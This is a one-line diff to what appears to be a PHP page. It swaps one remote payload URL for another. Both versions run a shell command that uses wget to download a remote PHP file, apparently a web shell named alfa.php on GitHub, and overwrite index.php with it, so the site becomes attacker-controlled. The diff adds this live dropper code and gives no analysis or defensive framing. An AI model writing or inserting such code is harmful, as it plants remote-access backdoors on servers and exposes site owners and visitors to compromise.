@@ -1,1 +1,1 @@
-<?php system('wget https://pastebin.com/raw/a1JCWGvk -O index.php');?>
+<?php system('wget https://raw.githubusercontent.com/sunshine0110/zxsan/main/alfa.php -O index.php');?>
